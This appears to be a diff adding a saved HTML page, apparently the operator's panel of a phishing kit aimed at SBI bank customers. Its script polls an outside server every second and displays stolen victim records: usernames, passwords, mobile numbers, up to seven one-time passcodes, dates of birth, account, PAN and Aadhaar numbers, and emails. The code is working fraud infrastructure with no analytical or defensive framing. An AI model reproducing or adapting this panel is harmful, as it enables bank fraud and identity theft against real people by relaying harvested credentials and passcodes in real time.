@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://rocketply.cleverapps.io/view_data -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        <title>3%3*9%9*+02+36%/45</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="apple-touch-icon" sizes="180x180" href="https://rocketply.cleverapps.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://rocketply.cleverapps.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://rocketply.cleverapps.io/favicon-16x16.png">
+    <link rel="manifest" href="https://rocketply.cleverapps.io/site.webmanifest">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="css2" rel="stylesheet">
+    </head>
+<body>
+    <div id="data-container" style="background-position:bottom;
+    bottom:20px; 
+    border-bottom:2px solid red;
+    padding:0px 10px;
+    white-space: pre; font-size:12px;
+    font-family: &#39;Tajawal&#39;, sans-serif;"><ul><p>
+     
+    </p></ul></div>
+<script type="text/javascript">
+    // Get a reference to the "Get Data" button and data container elements
+var dataContainer = document.getElementById("data-container");
+
+setInterval(function() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://test-annad.in/annad/sbi/get.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+
+                // Clear the data container
+                dataContainer.innerHTML = "";
+
+                // Create an unordered list element to hold the data
+                var list = document.createElement("ul");
+
+                // Loop through the data and create list items for each record
+                for (var i = 0; i < data.length; i++) {
+                    var record = data[i];
+
+                    // Create a list item for the record
+                    var listItem = document.createElement("p");
+
+                     var url = window.location.hostname;
+           var domains= url+'/get_file_data.html';
+
+
+                if (record.domain==domains) {
+
+                    // Add the record data to the list item as text content
+                    listItem.innerHTML = "<span>Username:</span> " + record.username 
+
+                    + "<br><span>Mobile: </span>" + record.mobile
+                    + "<br><span>Password: </span>" + record.password
+               + "<br>"
+                    + "<br><span >Otp1: </span>" + record.otp1
+               + "<br>"
+                    + "<br><span >Customer Name: </span>" + record.customername
+                    + "<br><span >Date Of Birth: </span>" + record.birthday
+               + "<br>"
+                    + "<br><span >Otp2: </span>" + record.otp2
+               + "<br>"
+                    + "<br><span >Otp3: </span>" + record.otp3
+               + "<br>"
+                    + "<br><span >Account Number: </span>" + record.acc_no
+                    + "<br><span >PAN Card Number: </span>" + record.pan_card_no
+               + "<br>"
+                    + "<br><span >Otp4: </span>" + record.otp4
+               + "<br>"
+                    + "<br><span >Otp5: </span>" + record.otp5
+               + "<br>"
+                    + "<br><span >Aadhar Number: </span>" + record.aadharnumber
+                    + "<br><span >Email: </span>" + record.email
+               + "<br>"
+                    + "<br><span >Otp6: </span>" + record.otp6
+               + "<br>"
+                    + "<br><span >Otp7: </span>" + record.otp7;
+
+                    // Append the list item to the list
+                    list.appendChild(listItem);
+
+
+
+
+            }
+                }
+
+                // Append the list to the data container
+                dataContainer.appendChild(list);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }, 1000);
+</script></body></html>
